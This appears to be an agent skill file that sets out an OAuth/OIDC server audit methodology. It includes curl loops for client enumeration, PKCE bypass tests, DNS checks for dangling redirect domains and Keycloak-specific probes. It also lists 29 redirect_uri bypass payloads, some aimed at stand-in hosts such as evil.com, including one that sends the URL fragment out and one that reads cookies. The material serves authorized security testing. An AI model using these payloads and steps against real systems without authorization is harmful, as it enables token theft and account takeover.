---
name: oauth_audit
description: OAuth server audit — enumerate clients, test redirect_uri bypasses, PKCE enforcement, DNS health checks on redirect domains, Keycloak-specific checks
---

# OAuth Server Audit

Systematic enumeration and security testing of OAuth 2.0 / OpenID Connect authorization servers. Goes beyond testing a single client flow — this methodology maps the entire OAuth surface: all clients, all redirect URIs, all grant types, PKCE enforcement, and DNS health of redirect domains. A dangling redirect URI domain is a HIGH-severity finding that yields direct token theft.

## Discovery

### Detect OAuth/OIDC Servers

```bash
# OpenID Connect discovery
curl -s https://TARGET/.well-known/openid-configuration | jq .
curl -s https://auth.TARGET/.well-known/openid-configuration | jq .
curl -s https://sso.TARGET/.well-known/openid-configuration | jq .
curl -s https://login.TARGET/.well-known/openid-configuration | jq .
curl -s https://accounts.TARGET/.well-known/openid-configuration | jq .

# OAuth2 well-known (RFC 8414)
curl -s https://TARGET/.well-known/oauth-authorization-server | jq .

# Common authorization endpoints
curl -sI https://TARGET/oauth/authorize
curl -sI https://TARGET/oauth2/auth
curl -sI https://TARGET/authorize
curl -sI https://TARGET/connect/authorize

# Keycloak realm endpoints
curl -s https://TARGET/realms/master/.well-known/openid-configuration | jq .
curl -s https://TARGET/auth/realms/master/.well-known/openid-configuration | jq .
for realm in master main default app internal admin; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' "https://TARGET/realms/$realm")
  echo "$realm: $STATUS"
done
```

Save the discovery document — it reveals `authorization_endpoint`, `token_endpoint`, `registration_endpoint`, `grant_types_supported`, `response_types_supported`, `response_modes_supported`, and `code_challenge_methods_supported`.

## Client Enumeration via Error Differential

Authorization servers return different errors for invalid client IDs vs valid client IDs with wrong redirect URIs. This differential lets you enumerate valid client IDs without credentials.

```bash
# Step 1: Establish baseline error for a definitely-invalid client_id
curl -s "https://AUTH_SERVER/authorize?client_id=xxxxxxx_nonexistent_xxxxxxx&response_type=code&redirect_uri=https://example.com" | grep -i error
# Expected: "invalid_client" or "client_id not found" or "unauthorized_client"

# Step 2: Try common client IDs and compare the error
for CLIENT in web mobile cli dashboard admin api default public \
  webapp frontend backend portal console app service internal \
  grafana prometheus monitoring jenkins gitlab argocd vault \
  spa ios android desktop electron; do
  RESP=$(curl -s "https://AUTH_SERVER/authorize?client_id=$CLIENT&response_type=code&redirect_uri=https://attacker.com/callback")
  ERROR=$(echo "$RESP" | grep -oiE '(invalid_client|client.not.found|redirect.uri|does not match|not registered|unknown client|invalid redirect)')
  echo "$CLIENT: $ERROR"
done

# Key differential:
# "invalid_client"          → client does NOT exist
# "redirect_uri mismatch"   → client EXISTS (valid client_id confirmed)
# "redirect_uri not match"  → client EXISTS
# 302 redirect              → client EXISTS and redirect_uri was ACCEPTED
```

## Per-Client Deep Testing

For each discovered valid client_id, run the following battery.

### Detect Client Type (Public vs Confidential)

```bash
# Step 1: Start a normal auth flow with the client to obtain a code
# Step 2: Exchange the code WITHOUT a client_secret

curl -s -X POST https://AUTH_SERVER/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTHORIZATION_CODE" \
  -d "redirect_uri=https://LEGITIMATE_REDIRECT" \
  -d "client_id=TARGET_CLIENT"

# Responses:
# Token returned           → PUBLIC client (no secret required)
# "unauthorized_client"    → CONFIDENTIAL client (secret required)
# "invalid_client"         → CONFIDENTIAL client

# Public clients are higher risk: any redirect_uri bypass = direct token theft
```

### Map Redirect URIs via Error Probing

```bash
# Try different redirect_uri values and observe errors to infer the allowlist
for URI in \
  "https://TARGET/callback" \
  "https://TARGET/oauth/callback" \
  "https://TARGET/auth/callback" \
  "https://TARGET/login/callback" \
  "https://app.TARGET/callback" \
  "https://dashboard.TARGET/callback" \
  "https://staging.TARGET/callback" \
  "https://dev.TARGET/callback" \
  "http://localhost:3000/callback" \
  "http://localhost:8080/callback" \
  "http://127.0.0.1/callback" \
  "myapp://callback" \
  "com.target.app://callback"; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://AUTH_SERVER/authorize?client_id=VALID_CLIENT&response_type=code&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$URI', safe=''))")")
  echo "$URI → $STATUS"
done
# 302 = redirect_uri accepted (in the allowlist)
# 400 = redirect_uri rejected
```

### DNS Health Check on Redirect URIs (HIGH-SEVERITY CHECK)

Every accepted redirect_uri domain must be resolvable and owned by the target. A dangling domain = token theft.

```bash
# Extract domains from discovered redirect URIs
for DOMAIN in app.target.com dashboard.target.com legacy.target.com; do
  echo "=== $DOMAIN ==="

  # DNS resolution
  dig +short "$DOMAIN" A
  dig +short "$DOMAIN" CNAME

  # Check NXDOMAIN
  dig "$DOMAIN" A +noall +comments | grep -i "NXDOMAIN" && echo "!!! NXDOMAIN - POTENTIALLY REGISTERABLE !!!"

  # Check SERVFAIL
  dig "$DOMAIN" A +noall +comments | grep -i "SERVFAIL" && echo "!!! SERVFAIL - DNS MISCONFIGURATION !!!"

  # HTTP reachability
  curl -s -o /dev/null -w "HTTP %{http_code} SSL_VERIFY: %{ssl_verify_result}\n" \
    --connect-timeout 5 "https://$DOMAIN/" || echo "!!! CONNECTION FAILED !!!"

  # WHOIS expiry check
  whois "$DOMAIN" 2>/dev/null | grep -iE '(expir|registrar|status)'

  # Wayback Machine check for historical presence
  curl -s "https://web.archive.org/web/timemap/link/$DOMAIN" | head -5
done

# NXDOMAIN redirect_uri in an active OAuth client = CRITICAL finding
# Register the domain → receive authorization codes/tokens for any user
```

### PKCE Enforcement Testing

```bash
# Test 1: Authorization request WITH PKCE, token exchange WITHOUT code_verifier
# Generate PKCE values
CODE_VERIFIER=$(python3 -c "import secrets,base64; v=secrets.token_urlsafe(32); print(v)")
CODE_CHALLENGE=$(echo -n "$CODE_VERIFIER" | openssl dgst -sha256 -binary | base64 | tr '+/' '-_' | tr -d '=')

# Send auth request with PKCE
curl -s "https://AUTH_SERVER/authorize?client_id=CLIENT&response_type=code&redirect_uri=REDIRECT&code_challenge=$CODE_CHALLENGE&code_challenge_method=S256&scope=openid"
# ... user authenticates, get code ...

# Exchange WITHOUT code_verifier
curl -s -X POST https://AUTH_SERVER/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=REDIRECT&client_id=CLIENT"
# Token returned = PKCE NOT enforced (HIGH severity for public clients)

# Test 2: Wrong code_verifier
curl -s -X POST https://AUTH_SERVER/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=REDIRECT&client_id=CLIENT" \
  -d "code_verifier=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
# Token returned = PKCE validation broken

# Test 3: Downgrade S256 to plain
curl -s "https://AUTH_SERVER/authorize?client_id=CLIENT&response_type=code&redirect_uri=REDIRECT&code_challenge=KNOWN_VALUE&code_challenge_method=plain&scope=openid"
# Then exchange with code_verifier=KNOWN_VALUE
# Token returned = S256 downgrade to plain accepted

# Test 4: Auth without any PKCE params on a public client
curl -s "https://AUTH_SERVER/authorize?client_id=PUBLIC_CLIENT&response_type=code&redirect_uri=REDIRECT&scope=openid"
# If server does not require PKCE for public clients = vulnerability
```

### Silent Auth and Response Mode Testing

```bash
# prompt=none: silent authentication — can leak tokens without user interaction
curl -s -D- "https://AUTH_SERVER/authorize?client_id=CLIENT&response_type=code&redirect_uri=REDIRECT&scope=openid&prompt=none"
# If 302 with code in redirect → silent auth works (useful for chaining with redirect_uri bypass)

# response_mode variants (some leak tokens in URLs or enable cross-origin exfil)
for MODE in query fragment form_post web_message; do
  curl -s -o /dev/null -w "$MODE: %{http_code}\n" \
    "https://AUTH_SERVER/authorize?client_id=CLIENT&response_type=code&redirect_uri=REDIRECT&scope=openid&response_mode=$MODE"
done
# web_message: postMessage-based delivery — test for origin validation issues
# query: code in URL query string — visible in logs, Referer headers
# fragment: code in URL fragment — accessible to JavaScript on redirect page
```

## Redirect URI Bypass Techniques (29 Variants)

Test every technique against each discovered client's redirect_uri allowlist. If the allowed redirect is `https://app.target.com/callback`:

```
# 1. Path traversal
https://app.target.com/callback/../attacker-page
https://app.target.com/callback/..%2F..%2Fattacker-page
https://app.target.com/callback%2F..%2F..%2Fattacker

# 2. Parameter pollution (double redirect_uri)
redirect_uri=https://app.target.com/callback&redirect_uri=https://evil.com

# 3. Subdomain injection
https://evil.app.target.com/callback
https://app.target.com.evil.com/callback

# 4. @-syntax (userinfo confusion)
https://app.target.com@evil.com/callback
https://app.target.com%40evil.com/callback

# 5. Fragment injection
https://app.target.com/callback#@evil.com
https://app.target.com/callback%23@evil.com

# 6. Localhost variants (common in dev allowlists)
http://127.0.0.1/callback
http://0.0.0.0/callback
http://[::1]/callback
http://localhost/callback
http://127.1/callback
http://2130706433/callback
http://0x7f000001/callback

# 7. Open redirect chain
https://app.target.com/redirect?url=https://evil.com
https://app.target.com/login?next=https://evil.com
https://app.target.com/goto?link=https://evil.com

# 8. URL encoding of path separators
https://app.target.com/%2e%2e/evil
https://app.target.com/callback/..%252f..%252fevil

# 9. Case variation
https://APP.TARGET.COM/callback
https://app.target.com/CALLBACK
HTTPS://APP.TARGET.COM/CALLBACK

# 10. Port injection
https://app.target.com:443/callback
https://app.target.com:8443/callback
https://app.target.com:80/callback

# 11. Trailing dot (DNS)
https://app.target.com./callback

# 12. Backslash confusion
https://app.target.com\@evil.com/callback
https://app.target.com%5c@evil.com/callback

# 13. Null byte
https://app.target.com/callback%00.evil.com

# 14. Tab/newline injection
https://app.target.com/callback%09
https://app.target.com/callback%0d%0a

# 15. Scheme variation
http://app.target.com/callback
HTTP://app.target.com/callback

# 16. Trailing slash permutation
https://app.target.com/callback/
https://app.target.com/callback//

# 17. Path parameter injection
https://app.target.com/callback;evil
https://app.target.com/callback;@evil.com

# 18. Query string pollution
https://app.target.com/callback?next=https://evil.com
https://app.target.com/callback?redirect=https://evil.com

# 19. Unicode normalization
https://app.target.com/\u0063allback
https://app.target.com/\u2025/evil

# 20. Double URL encoding
https://app.target.com/%252e%252e/evil
https://app.target.com/callback%252F..%252Fevil

# 21. IPv4/IPv6 of target domain
https://93.184.216.34/callback

# 22. Custom scheme (mobile)
myapp://callback
com.target.app://callback
target-app://callback

# 23. Data URI
data:text/html,<script>location='https://evil.com/?'+location.hash</script>

# 24. JavaScript URI
javascript://app.target.com/%0aalert(document.cookie)

# 25. Wildcard subdomain abuse
https://anything.target.com/callback
https://evil-app.target.com/callback

# 26. Suffix matching bypass
https://nottarget.com/callback
https://mytarget.com/callback

# 27. Protocol-relative
//evil.com/callback

# 28. IDN homograph
https://app.targ\u0435t.com/callback  (Cyrillic 'e')

# 29. Port zero / high port
https://app.target.com:0/callback
https://app.target.com:65535/callback
```

## Keycloak-Specific Checks

Keycloak is the most common open-source OAuth/OIDC server. It has known patterns.

```bash
# Enumerate realms
for REALM in master main app internal staging dev test production default; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' "https://TARGET/realms/$REALM")
  [ "$STATUS" != "404" ] && echo "Realm found: $REALM ($STATUS)"
done

# Master realm exposure (admin access)
curl -s "https://TARGET/realms/master/.well-known/openid-configuration" | jq .

# Admin console
curl -sI "https://TARGET/admin/master/console/"
curl -sI "https://TARGET/auth/admin/master/console/"

# Client registration endpoint (create arbitrary clients)
curl -s -X POST "https://TARGET/realms/REALM/clients-registrations/default" \
  -H "Content-Type: application/json" \
  -d '{"redirectUris":["https://evil.com/*"],"clientId":"test-audit","publicClient":true}'
# If 201 → dynamic registration is open → register client with evil redirect_uri

# Default clients per realm (known Keycloak defaults)
for CLIENT in account account-console admin-cli broker realm-management security-admin-console; do
  RESP=$(curl -s "https://TARGET/realms/REALM/protocol/openid-connect/auth?client_id=$CLIENT&response_type=code&redirect_uri=https://attacker.com")
  echo "$CLIENT: $(echo "$RESP" | grep -oiE '(invalid_client|redirect|error)' | head -1)"
done

# Password grant (Resource Owner Password Credentials)
curl -s -X POST "https://TARGET/realms/REALM/protocol/openid-connect/token" \
  -d "grant_type=password&client_id=PUBLIC_CLIENT&username=test&password=test"
# If grant_type=password is supported on a public client → brute force risk

# Token introspection without auth
curl -s -X POST "https://TARGET/realms/REALM/protocol/openid-connect/token/introspect" \
  -d "token=ACCESS_TOKEN&client_id=PUBLIC_CLIENT"

# User count / enumeration
curl -s "https://TARGET/realms/REALM/protocol/openid-connect/auth?client_id=account&response_type=code&redirect_uri=https://TARGET/realms/REALM/account&scope=openid&kc_action=REGISTER"
```

## Wayback Machine for Historical Redirect Domains

```bash
# Check if any historical redirect URIs pointed to now-dead domains
# Fetch historical URLs from the target
curl -s "https://web.archive.org/cdx/search/cdx?url=*.target.com&output=text&fl=original&collapse=urlkey" | \
  grep -iE 'redirect_uri|callback|oauth' | \
  grep -oP 'redirect_uri=\K[^&]+' | \
  python3 -c "import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]" | \
  sort -u

# For each historical redirect domain, check DNS
# (pipe into the DNS health check above)
```

## Testing Methodology

1. **Discover** the OAuth/OIDC server and fetch the discovery document
2. **Enumerate clients** using the error differential technique with common client IDs
3. **Classify each client** as public or confidential
4. **Map redirect URIs** for each client by probing with various URIs
5. **DNS health check** every accepted redirect URI domain — flag NXDOMAIN immediately
6. **Fuzz redirect URIs** with all 29 bypass techniques per client
7. **Test PKCE** enforcement on every public client
8. **Test silent auth** (`prompt=none`) per client
9. **Test response modes** (query, fragment, form_post, web_message)
10. **Keycloak-specific** checks if the server is Keycloak
11. **Wayback Machine** for historical redirect domains

## Validation Requirements

1. **Client enumeration**: Show the error differential proving a client_id exists
2. **Redirect URI bypass**: Capture the authorization code or token at an attacker-controlled URL
3. **PKCE bypass**: Show token exchange succeeding without a valid code_verifier on a public client
4. **Dangling redirect URI**: Show NXDOMAIN resolution + demonstrate the domain is registerable
5. **Silent auth**: Show token delivery via `prompt=none` without user interaction

## Impact

- **Dangling redirect_uri domain** (NXDOMAIN): Register the domain, receive all OAuth tokens/codes for that client. Account takeover at scale. Typically CVSS 8.1-9.1.
- **PKCE bypass on public client**: Authorization code interception on mobile/SPA clients. Account takeover. Typically CVSS 7.4-8.1.
- **Redirect URI bypass**: Steal authorization code or token via crafted URL. Account takeover for any user who clicks the link.
- **Open client registration**: Register arbitrary clients with attacker-controlled redirect URIs. Full OAuth bypass.
- **Password grant on public client**: Brute-force user credentials without rate limiting.

## Pro Tips

1. The error differential for client enumeration works on almost every OAuth server -- the spec requires different error codes for unknown clients vs redirect_uri mismatch
2. Public clients without PKCE enforcement are equivalent to no authentication on the authorization code flow
3. `prompt=none` combined with a redirect_uri bypass gives silent, zero-click token theft
4. Keycloak's `account` client is present in every realm by default and often has overly permissive redirect URIs
5. Check mobile app redirect URIs (custom schemes like `myapp://`) -- these are often registered alongside web URIs and may not validate the calling app
6. DNS health checks should include CNAME chain resolution -- a CNAME pointing to a deprovisioned service is equally exploitable
7. Always check the Wayback Machine -- redirect domains that were valid years ago may have expired since

## Summary

An OAuth server audit is not about testing one flow -- it is about mapping the entire authorization surface. Enumerate every client, classify it, map its redirect URIs, and check the DNS health of every redirect domain. A single dangling redirect URI domain or PKCE bypass on a public client yields account takeover at scale.
